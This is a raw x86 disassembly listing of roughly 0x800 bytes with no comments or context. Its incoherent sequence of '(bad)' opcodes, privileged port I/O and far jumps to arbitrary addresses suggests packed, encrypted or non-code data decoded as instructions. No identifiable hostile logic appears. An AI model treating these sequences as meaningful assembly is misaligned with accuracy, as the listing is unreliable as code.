  41444f:	inc    ebx
  414450:	dec    ecx
  414451:	test   al,0xe6
  414453:	push   0x49
  414455:	xor    al,0x61
  414457:	inc    ecx
  414458:	sub    cl,bl
  41445a:	(bad)  
  41445b:	fldcw  WORD PTR [ebx]
  41445d:	test   esi,eax
  41445f:	lahf   
  414460:	fcom   DWORD PTR [esi-0x4e]
  414463:	test   esp,0xb007e2b
  414469:	inc    eax
  41446a:	jmp    0xd5e8:0x1c9789fc
  414471:	test   BYTE PTR [ebp+0x7e9e58c],al
  414477:	rol    cl,0x3a
  41447a:	pop    ss
  41447b:	retf   
  41447c:	arpl   ax,dx
  41447e:	pop    ebx
  41447f:	jb     0x4144e5
  414481:	loop   0x414436
  414483:	test   DWORD PTR [ebp+0x6f],ebp
  414486:	lods   eax,DWORD PTR ds:[esi]
  414487:	inc    eax
  414488:	mov    ch,0xbd
  41448a:	and    DWORD PTR [esi+0x4f4f1c5],eax
  414490:	scas   al,BYTE PTR es:[edi]
  414491:	inc    edi
  414492:	sub    ah,BYTE PTR [esi+edi*2+0x3f]
  414496:	xchg   esi,eax
  414497:	scas   eax,DWORD PTR es:[edi]
  414498:	sar    BYTE PTR [ecx+0x66],cl
  41449b:	jecxz  0x41445e
  41449d:	mov    eax,0x711fe539
  4144a2:	mov    ebx,esp
  4144a4:	repnz mov edx,0x29e589ff
  4144aa:	add    BYTE PTR [edx+0x6f6917b4],cl
  4144b0:	(bad)  
  4144b1:	pop    esi
  4144b2:	lds    ecx,FWORD PTR [edi+0x6b]
  4144b5:	sahf   
  4144b6:	pop    ecx
  4144b7:	outs   dx,DWORD PTR ds:[esi]
  4144b8:	or     bh,BYTE PTR [ebx-0x5d]
  4144bb:	retf   
  4144bc:	adc    al,0xcf
  4144be:	and    edx,DWORD PTR [edi]
  4144c0:	rcl    BYTE PTR [edi],0xb4
  4144c3:	inc    ecx
  4144c4:	sub    esi,DWORD PTR [esi+ebp*2+0x11cdc03f]
  4144cb:	into   
  4144cc:	mov    cl,cl
  4144ce:	pop    esi
  4144cf:	gs jecxz 0x414458
  4144d2:	jnp    0x414532
  4144d4:	mov    eax,0x231678db
  4144d9:	mov    ecx,DWORD PTR [ecx-0x380656a6]
  4144df:	add    bh,dh
  4144e1:	jmp    0x5f20:0x63c15c2b
  4144e8:	push   0x7fcf5045
  4144ed:	in     al,0x72
  4144ef:	and    eax,0x4b2e07b4
  4144f4:	ins    DWORD PTR es:[edi],dx
  4144f5:	gs sub al,0xa6
  4144f8:	aad    0x31
  4144fa:	or     ecx,DWORD PTR [ecx]
  4144fc:	jecxz  0x41453d
  4144fe:	ds fwait
  414500:	mov    edi,0xbf87271b
  414505:	int    0x5a
  414507:	sub    al,BYTE PTR [ebx]
  414509:	and    eax,0x25919f0d
  41450e:	push   ss
  41450f:	stc    
  414510:	sub    bh,BYTE PTR [ebx-0x2e]
  414513:	mov    DWORD PTR [ebp+0x1fce280f],edi
  414519:	xchg   esi,edi
  41451b:	fs inc esp
  41451d:	pop    edi
  41451e:	jae    0x4144e8
  414520:	je     0x4144e4
  414522:	mov    eax,0xe1e44d2c
  414527:	aas    
  414528:	jge    0x4144b1
  41452a:	jmp    0xcdbea70a
  41452f:	xor    al,0xa
  414531:	jle    0x41453a
  414533:	gs adc edx,eax
  414536:	dec    ecx
  414537:	test   ah,bh
  414539:	imul   esi,DWORD PTR [ebx+eax*4+0x6af223de],0x186ce39
  414544:	scas   eax,DWORD PTR es:[edi]
  414545:	dec    esp
  414546:	dec    ecx
  414547:	adc    ebx,DWORD PTR [ecx]
  414549:	les    eax,FWORD PTR [eax+0x60]
  41454c:	out    0x75,eax
  41454e:	mov    esi,DWORD PTR [esi]
  414550:	mov    cs,WORD PTR [edi+0x285ec7ce]
  414556:	stos   DWORD PTR es:[edi],eax
  414557:	xchg   edi,eax
  414558:	mov    esp,0x2440e902
  41455d:	arpl   cx,di
  41455f:	dec    ecx
  414560:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414562:	imul   esp,DWORD PTR [edx-0x71],0xf80a46d
  414569:	jl     0x4145cc
  41456b:	xchg   edx,eax
  41456c:	sbb    al,0x57
  41456e:	push   esi
  41456f:	jb     0x4145ee
  414571:	sbb    DWORD PTR [ebp+0x10ba30a9],0xffffffb2
  414578:	test   eax,0x367c4c7d
  41457d:	pop    esp
  41457f:	xchg   BYTE PTR [ebx],dl
  414581:	leave  
  414582:	sub    esp,edx
  414584:	retf   0x1272
  414587:	mul    DWORD PTR [edi]
  414589:	rol    DWORD PTR [ebx+0x20932f14],1
  41458f:	lods   eax,DWORD PTR ds:[esi]
  414590:	outs   dx,DWORD PTR ds:[esi]
  414591:	add    eax,0x356c3ffc
  414596:	cli    
  414597:	popa   
  414598:	cld    
  414599:	adc    eax,0xd716766f
  41459e:	call   0xefec:0xa9ab1bed
  4145a5:	arpl   WORD PTR [esp+edx*1+0x587c79d2],dx
  4145ac:	and    dl,BYTE PTR [ebp-0x3e]
  4145af:	fcomip st,st(2)
  4145b1:	cmp    bh,bl
  4145b3:	clc    
  4145b4:	fwait
  4145b5:	stc    
  4145b6:	sub    edx,ecx
  4145b8:	inc    esi
  4145b9:	imul   esi,DWORD PTR [ecx+0x52],0x5cc6990a
  4145c0:	dec    ecx
  4145c1:	jns    0x414642
  4145c3:	mov    ah,0x17
  4145c5:	adc    eax,0x897639fa
  4145ca:	test   BYTE PTR [eax+0x6aac1dda],bl
  4145d0:	jnp    0x414643
  4145d2:	jmp    0x6489:0xeeb92726
  4145d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145da:	and    BYTE PTR ds:0x17903bbd,ah
  4145e0:	jg     0x414658
  4145e2:	push   edi
  4145e3:	les    ecx,FWORD PTR fs:[ebp+0x58c05fd4]
  4145ea:	jo     0x4145e4
  4145ec:	mov    cl,0x16
  4145ee:	xor    edi,eax
  4145f0:	(bad)  
  4145f1:	pminub mm1,QWORD PTR [ebx+0x56b9560e]
  4145f8:	pusha  
  4145f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145fa:	neg    DWORD PTR [ebx+0x7830064f]
  414600:	jmp    0x76da50f7
  414605:	cmp    DWORD PTR [ebx],eax
  414607:	xor    DWORD PTR [ecx+0x36],ebp
  41460a:	cli    
  41460b:	push   ss
  41460c:	pusha  
  41460d:	les    eax,FWORD PTR [ecx+0x477b4fef]
  414613:	adc    edx,edx
  414615:	sti    
  414616:	addr16 xchg esi,eax
  414618:	or     ecx,0x1f1a2c47
  41461e:	pop    ss
  41461f:	out    0x3e,eax
  414621:	(bad)  
  414622:	stc    
  414623:	sub    eax,0xa9d4dd19
  414628:	dec    eax
  414629:	push   esp
  41462a:	adc    dh,bh
  41462c:	inc    esp
  41462d:	ret    0xf626
  414630:	mov    edi,0xbdf3064a
  414635:	mov    bh,0xa2
  414637:	xchg   ebx,eax
  414638:	pop    ecx
  414639:	lods   eax,DWORD PTR ds:[esi]
  41463a:	sbb    eax,0x4d180a21
  41463f:	dec    esi
  414640:	sub    eax,DWORD PTR [ecx+0x5d55e2ff]
  414646:	mov    ch,0xbf
  414648:	mov    bh,0x28
  41464a:	adc    al,0x3f
  41464c:	add    BYTE PTR [ebp+0xa],al
  41464f:	cdq    
  414650:	cwde   
  414651:	(bad)  
  414652:	push   es
  414653:	stos   DWORD PTR es:[edi],eax
  414654:	mov    edx,esp
  414656:	cld    
  414657:	(bad)  [edx+0x43]
  41465a:	out    dx,al
  41465b:	pop    eax
  41465c:	xor    BYTE PTR [edx],cl
  41465e:	into   
  41465f:	adc    esi,ebp
  414661:	or     eax,esi
  414663:	xchg   DWORD PTR [edx+0x5fd2f90d],esi
  414669:	daa    
  41466a:	lods   eax,DWORD PTR ds:[esi]
  41466b:	int3   
  41466c:	leave  
  41466d:	addr16 mov dh,0x94
  414670:	xchg   esi,eax
  414671:	not    DWORD PTR [ebx]
  414673:	js     0x414634
  414675:	dec    ecx
  414676:	sbb    DWORD PTR [ebp-0x14],eax
  414679:	shr    DWORD PTR [eax-0x5abb070],cl
  41467f:	hlt    
  414680:	lea    eax,[edi+eax*2+0x170ccfe5]
  414687:	(bad)
  41468b:	mov    eax,ds:0xcaa8e9f4
  414690:	jbe    0x4146b4
  414692:	xlat   BYTE PTR ds:[ebx]
  414693:	and    ah,bh
  414695:	mov    DWORD PTR [esi],edx
  414697:	adc    al,0x33
  414699:	test   dl,0x71
  41469c:	int    0x84
  41469e:	ret    0x1954
  4146a1:	gs in  eax,0x58
  4146a4:	pop    eax
  4146a5:	scas   al,BYTE PTR es:[edi]
  4146a6:	nop
  4146a7:	push   ecx
  4146a8:	call   0x2b3f7cd
  4146ad:	mov    ebp,0x39b6ed85
  4146b2:	mov    al,0x69
  4146b4:	jg     0x414656
  4146b6:	popa   
  4146b7:	das    
  4146b8:	push   ss
  4146b9:	or     edx,DWORD PTR [ebx]
  4146bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146bc:	adc    ebp,DWORD PTR [ecx+0x3c]
  4146bf:	fisttp QWORD PTR [eax-0x3126f8f0]
  4146c5:	adc    DWORD PTR [ecx-0x718497ca],edi
  4146cb:	in     eax,0xf2
  4146cd:	jl     0x4146a4
  4146cf:	mov    esp,0x83d9bc28
  4146d4:	aad    0x41
  4146d6:	in     eax,dx
  4146d7:	loopne 0x41473f
  4146d9:	sub    eax,0x339c505b
  4146de:	pop    esi
  4146df:	xchg   bh,al
  4146e1:	ins    BYTE PTR es:[edi],dx
  4146e2:	outs   dx,DWORD PTR ds:[esi]
  4146e3:	mov    edx,0x7ee02ea4
  4146e8:	jns    0x4146ab
  4146ea:	mov    ebp,0x6120f96
  4146ef:	ja     0x41467c
  4146f1:	test   al,0x3f
  4146f3:	fldcw  WORD PTR [ecx+0x7c]
  4146f6:	xchg   BYTE PTR [ecx-0xa],cl
  4146f9:	shl    DWORD PTR [edi+0x4b40cf39],1
  4146ff:	nop
  414700:	pop    esp
  414701:	iret   
  414702:	add    DWORD PTR [ecx-0x7063e1ad],esp
  414708:	mov    ah,0x23
  41470a:	in     al,dx
  41470b:	imul   edx,DWORD PTR [esi+0x4919b543],0x58
  414712:	ja     0x41477c
  414714:	scas   al,BYTE PTR es:[edi]
  414715:	mov    ch,0xb
  414717:	push   ecx
  414718:	cs shr al,0xaf
  41471c:	call   0x4774:0xab24cd01
  414723:	arpl   WORD PTR [eax+0x38554a30],dx
  414729:	push   edx
  41472a:	adc    esi,DWORD PTR ds:0x5f147e67
  414730:	add    bh,BYTE PTR fs:[ebx]
  414733:	shr    BYTE PTR [eax],0x68
  414736:	xchg   ebp,eax
  414737:	outs   dx,DWORD PTR ds:[esi]
  414738:	pop    edx
  414739:	jne    0x4146e6
  41473b:	hlt    
  41473c:	std    
  41473d:	pushf  
  41473e:	add    dl,BYTE PTR [ebp-0x32]
  414741:	outs   dx,DWORD PTR ds:[esi]
  414742:	cmp    al,0x1c
  414744:	sub    esp,esp
  414746:	ret    
  414747:	mov    cl,0x2d
  414749:	ss in  eax,0xc1
  41474c:	je     0x4146d7
  41474e:	mov    ebp,edi
  414750:	jp     0x4146d8
  414752:	dec    eax
  414753:	out    dx,al
  414754:	xor    esp,edi
  414756:	fidivr WORD PTR [ebx]
  414758:	cdq    
  414759:	inc    ecx
  41475a:	fcomp  QWORD PTR [ebx+0xbf7f3ab]
  414760:	call   0x9f2b1588
  414765:	mov    dl,0x37
  414767:	and    BYTE PTR [esi+ebx*2-0xc],cl
  41476b:	mov    dl,0xc5
  41476d:	jo     0x4147a1
  41476f:	(bad)  
  414770:	cdq    
  414771:	push   ss
  414772:	xchg   ecx,eax
  414773:	mov    BYTE PTR [ebx-0x10],bl
  414776:	out    0x92,eax
  414778:	gs sub al,0x85
  41477b:	push   ebx
  41477c:	loope  0x4147f0
  41477e:	stos   BYTE PTR es:[edi],al
  41477f:	clc    
  414780:	loope  0x4147ab
  414782:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414784:	or     BYTE PTR ds:0x21546f7e,bl
  41478a:	mov    DWORD PTR [eax+edx*1-0x42f72104],esp
  414791:	adc    edx,DWORD PTR [ebx-0x4f]
  414794:	mov    bl,0x94
  414796:	inc    esp
  414797:	sbb    eax,0x9ec10ab3
  41479c:	sbb    al,0x4
  41479e:	xchg   esi,eax
  41479f:	pusha  
  4147a0:	outs   dx,DWORD PTR ds:[esi]
  4147a1:	jle    0x414732
  4147a3:	mov    bh,0xa3
  4147a5:	and    BYTE PTR [esi],cl
  4147a7:	fadd   DWORD PTR [edx]
  4147a9:	(bad)  
  4147aa:	adc    eax,0x564811be
  4147af:	push   0xffffffcc
  4147b1:	sub    al,0x1c
  4147b3:	push   ebx
  4147b4:	das    
  4147b5:	xor    cl,BYTE PTR [esi+0x61869a80]
  4147bb:	out    0x47,al
  4147bd:	xchg   dl,cl
  4147bf:	sub    al,0x82
  4147c1:	daa    
  4147c2:	inc    ebx
  4147c3:	je     0x414840
  4147c5:	test   BYTE PTR [ecx+0x6a],ah
  4147c8:	pop    ecx
  4147c9:	and    edi,DWORD PTR ds:0x8f1ad82d
  4147cf:	push   ebx
  4147d0:	jae    0x41483d
  4147d2:	cmp    dl,bl
  4147d4:	repz mov cl,0x4f
  4147d7:	icebp  
  4147d8:	stos   DWORD PTR es:[edi],eax
  4147d9:	pop    es
  4147da:	int    0x7e
  4147dc:	mov    edi,0x14ca6dd5
  4147e1:	mov    eax,ds:0x790b7129
  4147e6:	adc    al,0x2b
  4147e8:	and    dl,ah
  4147ea:	inc    esp
  4147eb:	sub    BYTE PTR [ebp-0x7e],ah
  4147ee:	addr16 push ebx
  4147f0:	enter  0x439d,0xd9
  4147f4:	aam    0xf9
  4147f6:	mov    bl,0xd6
  4147f8:	imul   eax,esp,0xffffff8a
  4147fb:	(bad)  
  4147fc:	mov    cl,0x3b
  4147fe:	or     DWORD PTR [eax+esi*2-0x18952425],0x48580e5b
  414809:	test   BYTE PTR [ecx+0x32e6f856],ah
  41480f:	dec    eax
  414810:	sbb    BYTE PTR [edi-0x21],bl
  414813:	fdiv   DWORD PTR [ecx]
  414815:	loopne 0x41486e
  414817:	(bad)  
  414819:	mov    bl,0x5f
  41481b:	xor    edi,edi
  41481d:	mov    al,ds:0x9712e350
  414822:	nop
  414823:	(bad)  
  414824:	jne    0x414821
  414826:	inc    eax
  414827:	popf   
  414828:	stos   DWORD PTR es:[edi],eax
  414829:	jecxz  0x4147fe
  41482b:	dec    eax
  41482c:	scas   al,BYTE PTR es:[edi]
  41482d:	lock and BYTE PTR [esi-0x51],bh
  414831:	xor    al,0xf
  414833:	xchg   DWORD PTR [edx],esp
  414835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414836:	inc    edx
  414837:	inc    ebx
  414838:	push   ds
  414839:	mov    eax,ds:0x1895bf1b
  41483e:	sti    
  41483f:	leave  
  414840:	lea    ebp,[ecx-0x41b4a6fc]
  414846:	int    0x8f
  414848:	stc    
  414849:	add    BYTE PTR [edi-0x35],bl
  41484c:	dec    edi
  41484d:	and    al,0xe6
  41484f:	cli    
  414850:	ja     0x414870
  414852:	inc    esi
  414853:	mov    bl,0xd3
  414855:	ins    BYTE PTR es:[edi],dx
  414856:	xor    DWORD PTR [eax+0x78b567b8],edi
  41485c:	add    cl,dl
  41485e:	lds    edi,FWORD PTR [edx+0x664e4fa9]
  414864:	add    DWORD PTR [ebp-0x44],edi
  414867:	jbe    0x414861
  414869:	sub    eax,0x4c5087b0
  41486e:	js     0x414851
  414870:	dec    ebx
  414871:	scas   eax,DWORD PTR es:[edi]
  414872:	jmp    FWORD PTR [ebp+0x62d1e638]
  414878:	cmp    dh,0x60
  41487b:	dec    eax
  41487c:	(bad)  
  41487d:	jl     0x4148bf
  41487f:	aam    0x76
  414881:	outs   dx,DWORD PTR ds:[esi]
  414882:	xchg   edi,eax
  414883:	into   
  414884:	imul   edx,DWORD PTR [ecx+0x5c],0xd5eb33e6
  41488b:	push   eax
  41488c:	and    eax,0x79b487f4
  414891:	cmc    
  414892:	pop    ebx
  414893:	or     ebx,DWORD PTR [ecx+edx*4]
  414896:	pop    edx
  414897:	pop    edi
  414898:	jns    0x414836
  41489a:	push   esp
  41489b:	in     eax,0xcf
  41489d:	(bad)  
  41489e:	(bad)  
  41489f:	jp     0x414898
  4148a1:	imul   esp,esp,0xffffff94
  4148a4:	bound  ebp,QWORD PTR [ecx-0x18]
  4148a7:	cmp    edx,ebp
  4148a9:	sti    
  4148aa:	adc    ebp,edx
  4148ac:	pop    ebx
  4148ad:	sbb    ebp,DWORD PTR [esi+esi*8-0xe3b8a8b]
  4148b4:	xchg   ebp,eax
  4148b5:	mov    edx,0x66ecb9fe
  4148ba:	mov    dl,0xb9
  4148bc:	jo     0x4148ec
  4148be:	xchg   ebp,eax
  4148bf:	cwde   
  4148c0:	mov    ds:0xd37d9067,eax
  4148c5:	ret    
  4148c6:	dec    eax
  4148c7:	cmp    al,0x9e
  4148c9:	scas   eax,DWORD PTR es:[edi]
  4148ca:	jecxz  0x4148c6
  4148cc:	sub    esi,DWORD PTR [ecx-0x74226907]
  4148d2:	push   ss
  4148d3:	pop    eax
  4148d4:	adc    edx,edi
  4148d6:	repnz mov DWORD PTR [eax],eax
  4148d9:	and    al,0x3c
  4148db:	in     al,dx
  4148dc:	dec    esp
  4148dd:	das    
  4148de:	ss mov bl,0xc4
  4148e1:	mov    esi,0xebd0ccd1
  4148e6:	into   
  4148e7:	mov    edi,0x1beadf51
  4148ec:	mov    edi,0xea871ca5
  4148f1:	adc    al,BYTE PTR [eax+0x6a]
  4148f4:	dec    esi
  4148f5:	jecxz  0x414895
  4148f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148f8:	call   0x1af9:0xa1edd358
  4148ff:	and    ebx,DWORD PTR [edi-0x52259226]
  414905:	sub    dh,BYTE PTR [edx]
  414907:	pop    ebp
  414908:	(bad)  
  414909:	and    cl,BYTE PTR [eax]
  41490b:	scas   eax,DWORD PTR es:[edi]
  41490c:	adc    DWORD PTR [ebx+0x45],edi
  41490f:	xor    BYTE PTR [eax+0x49],cl
  414912:	inc    eax
  414913:	imul   edx,ecx,0x2b
  414916:	inc    esp
  414917:	(bad)
  41491a:	or     ebx,DWORD PTR [edx-0x74]
  41491d:	dec    eax
  41491e:	int3   
  41491f:	or     dh,BYTE PTR [ecx-0x38fa29b1]
  414925:	dec    ebp
  414926:	stos   DWORD PTR es:[edi],eax
  414927:	cld    
  414928:	pop    esp
  414929:	lods   al,BYTE PTR ds:[esi]
  41492a:	nop
  41492b:	sub    eax,0xe7be552e
  414930:	pop    esp
  414931:	cmc    
  414932:	icebp  
  414933:	xchg   edi,eax
  414934:	aam    0xd5
  414936:	stos   DWORD PTR es:[edi],eax
  414937:	ss dec ecx
  414939:	mov    eax,ds:0x62431822
  41493e:	fld    DWORD PTR [ebp+0x2e384125]
  414944:	clc    
  414945:	pop    ebx
  414946:	or     BYTE PTR [eax+0x6c],0xbc
  41494a:	jnp    0x414958
  41494c:	addr16 stc 
  41494e:	mov    esi,0x23448f45
  414953:	push   edx
  414954:	mov    gs:0x680fe9e6,eax
  41495a:	mov    al,0x89
  41495c:	mov    bl,0x83
  41495e:	enter  0x2e92,0xe1
  414962:	mov    dh,BYTE PTR [ebx]
  414964:	dec    esi
  414965:	rcr    DWORD PTR [eax+edi*4],1
  414968:	jl     0x414918
  41496a:	mov    esp,0x464004f4
  41496f:	sbb    DWORD PTR [edx+0x6d52ea],edi
  414975:	loope  0x414968
  414977:	outs   dx,DWORD PTR ds:[esi]
  414978:	jg     0x4149da
  41497a:	iret   
  41497b:	sbb    eax,0x5ea6d8f6
  414980:	xchg   ebx,eax
  414981:	sub    al,0x4c
  414983:	jne    0x414945
  414985:	mov    al,0xd1
  414987:	mov    cl,0x23
  414989:	lock mov esp,edx
  41498c:	pusha  
  41498d:	fimul  WORD PTR [ebx]
  41498f:	sbb    ch,BYTE PTR [ecx+0x2c2165a6]
  414995:	ret    
  414996:	xlat   BYTE PTR ds:[ebx]
  414997:	pop    esp
  414998:	retf   0xb0ca
  41499b:	aad    0xa8
  41499d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499e:	fld    DWORD PTR [ebp+0x4c]
  4149a1:	por    mm4,QWORD PTR [ebx-0x84ce1e5]
  4149a8:	ins    BYTE PTR es:[edi],dx
  4149a9:	fidivr WORD PTR ds:0x70b18a66
  4149af:	sbb    edi,esp
  4149b1:	inc    ebx
  4149b2:	add    eax,0x1deaef7b
  4149b7:	inc    esi
  4149b8:	pop    ebx
  4149b9:	xchg   esi,eax
  4149ba:	repz jle 0x414a08
  4149bd:	cmp    BYTE PTR ss:[eax-0x6e8581b],ah
  4149c4:	and    esi,DWORD PTR [ebp-0x63041ce7]
  4149ca:	and    ecx,DWORD PTR [ebp-0x61]
  4149cd:	enter  0x5541,0x58
  4149d1:	mov    esp,0x890e9321
  4149d6:	shl    BYTE PTR [ecx-0x2e],1
  4149d9:	dec    edi
  4149da:	(bad)  
  4149db:	(bad)  
  4149dd:	and    DWORD PTR [ebp+ebx*8-0x2699df1f],edx
  4149e4:	in     al,dx
  4149e5:	mov    dh,0x1c
  4149e7:	pusha  
  4149e8:	jnp    0x41498e
  4149ea:	inc    edi
  4149eb:	mov    ah,0x3d
  4149ed:	rol    esi,0x20
  4149f0:	or     BYTE PTR [ebx],ch
  4149f2:	jae    0x4149bc
  4149f4:	or     DWORD PTR [esi+0xa4eb21c],edx
  4149fa:	xchg   ebp,edx
  4149fc:	inc    esp
  4149fd:	mov    dh,0x92
  4149ff:	test   DWORD PTR [ebp+edx*1+0x2d],edx
  414a03:	xor    al,0xd1
  414a05:	sbb    edx,ecx
  414a07:	lea    edx,[edi]
  414a09:	jbe    0x414a5b
  414a0b:	mov    bl,dh
  414a0d:	xchg   esi,eax
  414a0e:	fisttp WORD PTR [esi+eiz*2]
  414a11:	sub    al,0xc3
  414a13:	ins    DWORD PTR es:[edi],dx
  414a14:	pop    esi
  414a15:	imul   edx,DWORD PTR [ebx-0x45],0x7c2714e6
  414a1c:	push   ss
  414a1d:	rcr    esp,cl
  414a1f:	push   esi
  414a20:	shr    eax,0x39
  414a23:	sub    eax,0x22695cc
  414a28:	popa   
  414a29:	sar    esp,0xf1
  414a2c:	and    eax,0x2dead9d1
  414a31:	pop    es
  414a32:	inc    ebx
  414a33:	sbb    dl,BYTE PTR [esi-0x246ca1ae]
  414a39:	fwait
  414a3a:	jbe    0x414a30
  414a3c:	pop    es
  414a3d:	fsubr  QWORD PTR [edx+0x6224d3a6]
  414a43:	das    
  414a44:	sbb    al,BYTE PTR [ebx+0x77a20822]
  414a4a:	das    
  414a4b:	inc    ecx
  414a4c:	retf   0xed7c
  414a4f:	pop    ebx
  414a50:	pop    edx
  414a51:	xor    BYTE PTR [ebx-0x54],bh
  414a54:	shr    ah,1
  414a56:	mov    edx,0x79a102d5
  414a5b:	adc    esp,DWORD PTR [edx+0x1a]
  414a5e:	or     bl,BYTE PTR fs:0x136f6e9c
  414a65:	cmp    al,0xe3
  414a67:	dec    ebx
  414a68:	std    
  414a69:	mov    ah,0x2b
  414a6b:	not    BYTE PTR [edi+0x38e99c84]
  414a71:	jle    0x414a10
  414a73:	inc    ecx
  414a74:	jmp    0x9850c932
  414a79:	mov    esp,0xa78e6419
  414a7e:	jp     0x414a04
  414a80:	sbb    DWORD PTR [edx],esi
  414a82:	and    eax,0xfd559ab3
  414a87:	and    BYTE PTR [ebx+0x3c],dh
  414a8a:	jle    0x414a7f
  414a8c:	leave  
  414a8d:	ins    DWORD PTR es:[edi],dx
  414a8e:	xchg   edx,ebx
  414a90:	cld    
  414a91:	xchg   esi,eax
  414a92:	cdq    
  414a93:	imul   esi,DWORD PTR [eax-0x3ed68bfb],0xcaf4938d
  414a9d:	jge    0x414a35
  414a9f:	cli    
  414aa0:	mov    esp,0x51236fac
  414aa5:	leave  
  414aa6:	mov    eax,0xb2c8babd
  414aab:	shl    BYTE PTR [ecx+0x51b491f],cl
  414ab1:	pop    es
  414ab2:	pop    ss
  414ab3:	xlat   BYTE PTR ds:[ebx]
  414ab4:	inc    edi
  414ab5:	push   cs
  414ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab7:	jl     0x414adf
  414ab9:	gs scas al,BYTE PTR es:[edi]
  414abb:	fs push 0xffffffac
  414abe:	mov    ebp,0xa70d9e2c
  414ac3:	dec    dl
  414ac5:	fcom   QWORD PTR [ebx-0x5]
  414ac8:	xor    esp,edi
  414aca:	test   al,0xb9
  414acc:	(bad)  
  414acd:	or     al,0x13
  414acf:	scas   al,BYTE PTR es:[edi]
  414ad0:	sub    al,0xb9
  414ad2:	or     BYTE PTR [esi],dl
  414ad4:	icebp  
  414ad5:	push   ebp
  414ad6:	xor    ecx,DWORD PTR [edi]
  414ad8:	test   BYTE PTR [edx-0xa],cl
  414adb:	inc    ebp
  414adc:	push   0xb
  414ade:	leave  
  414adf:	or     eax,0xe52f9663
  414ae4:	fisubr DWORD PTR [eax]
  414ae6:	pop    ecx
  414ae7:	adc    DWORD PTR [edi+0x68],edx
  414aea:	shr    dh,1
  414aec:	int    0x21
  414aee:	mov    ecx,0xb118396b
  414af3:	popf   
  414af4:	push   ss
  414af5:	push   ss
  414af6:	pop    esp
  414af7:	sub    al,0x3f
  414af9:	mov    esp,0x60e379b3
  414afe:	and    DWORD PTR [ecx],0xfa4f70aa
  414b04:	imul   esp,DWORD PTR [esp+edi*1-0x13e28d15],0x166125d8
  414b0f:	or     DWORD PTR ds:0xb23b3855,esi
  414b15:	push   edx
  414b16:	mov    ebp,0xef1a75e5
  414b1b:	lahf   
  414b1c:	fwait
  414b1d:	mov    dl,0x66
  414b1f:	or     DWORD PTR [ebp-0x76],eax
  414b22:	pop    es
  414b23:	das    
  414b24:	or     al,0x5e
  414b26:	adc    DWORD PTR [eax+0x36],eax
  414b29:	cmp    ch,BYTE PTR [eax+0x6d64c541]
  414b2f:	push   esi
  414b30:	mov    ss,edi
  414b32:	pop    edx
  414b33:	ins    BYTE PTR es:[edi],dx
  414b34:	sbb    eax,0x4cfe6c7d
  414b39:	inc    esi
  414b3a:	add    eax,0x19cec46e
  414b3f:	jo     0x414b1e
  414b41:	fcomp  st(2)
  414b43:	pop    esp
  414b44:	loopne 0x414b19
  414b46:	shr    BYTE PTR [ecx+edi*2],cl
  414b49:	addr16 rol dl,1
  414b4c:	(bad)  
  414b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b4e:	add    BYTE PTR [edi+0x67],ah
  414b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b52:	mov    ebp,0x2c303042
  414b57:	push   ebx
  414b58:	mov    eax,ds:0xdd642d3f
  414b5d:	jg     0x414b7c
  414b5f:	cmp    dh,BYTE PTR [ecx+0x18]
  414b62:	push   ss
  414b63:	xor    edi,DWORD PTR [edi]
  414b65:	or     al,0x93
  414b67:	stos   DWORD PTR es:[edi],eax
  414b68:	enter  0x2e26,0xbd
  414b6c:	sub    BYTE PTR es:[eax-0x6d8c0b5d],0xd5
  414b74:	and    al,0xc3
  414b76:	add    al,0xd4
  414b78:	dec    esp
  414b79:	cdq    
  414b7a:	inc    edx
  414b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b7c:	mov    ah,0x97
  414b7e:	lea    edi,ds:0xa996d761
  414b84:	sbb    al,0x0
  414b86:	loopne 0x414baf
  414b88:	sbb    DWORD PTR [ecx+0x757d1056],esp
  414b8e:	aas    
  414b8f:	je     0x414b5b
  414b91:	dec    esp
  414b92:	ins    BYTE PTR es:[edi],dx
  414b93:	add    al,0xa
  414b95:	lds    esp,FWORD PTR [eax+ecx*4-0x9]
  414b99:	or     al,0xf8
  414b9b:	outs   dx,DWORD PTR ds:[esi]
  414b9c:	mov    bh,0x14
  414b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b9f:	lods   eax,DWORD PTR ds:[esi]
  414ba0:	add    al,0x10
  414ba2:	arpl   di,dx
  414ba4:	and    ah,BYTE PTR ds:0x85b69758
  414baa:	popa   
  414bab:	fisubr DWORD PTR [ebp+0x79]
  414bae:	sbb    edx,esi
  414bb0:	inc    ebp
  414bb1:	dec    eax
  414bb2:	lahf   
  414bb3:	loop   0x414bb9
  414bb5:	sbb    eax,0xdc4a817b
  414bba:	outs   dx,DWORD PTR ds:[esi]
  414bbb:	xchg   edi,eax
  414bbc:	out    0xd5,al
  414bbe:	mov    dl,0x1f
  414bc0:	mov    esp,0x249d6802
  414bc5:	imul   ebp,esi,0x35
  414bc8:	(bad)  
  414bc9:	not    BYTE PTR [eax+0xd]
  414bcc:	outs   dx,BYTE PTR ds:[esi]
  414bcd:	lds    ebx,FWORD PTR [edx]
  414bcf:	add    ch,0x3e
  414bd2:	mov    ebx,0x35fa13c6
  414bd7:	xor    BYTE PTR [edx],bh
  414bd9:	xor    al,0x3f
  414bdb:	jnp    0x414bc7
  414bdd:	das    
  414bde:	in     eax,0x9e
  414be0:	sub    eax,DWORD PTR [edx+0x7f6058d7]
  414be6:	arpl   WORD PTR ds:0x1e251e8c,si
  414bec:	cmp    eax,DWORD PTR [eax+0x64]
  414bef:	mov    esi,gs
  414bf1:	ins    DWORD PTR es:[edi],dx
  414bf2:	adc    al,ah
  414bf4:	xor    al,0x74
  414bf6:	ret    0x6fd5
  414bf9:	jo     0x414b7d
  414bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bfc:	iret   
  414bfd:	mov    ebp,0x120e39ca
  414c02:	mov    ah,0x24
  414c04:	outs   dx,DWORD PTR ds:[esi]
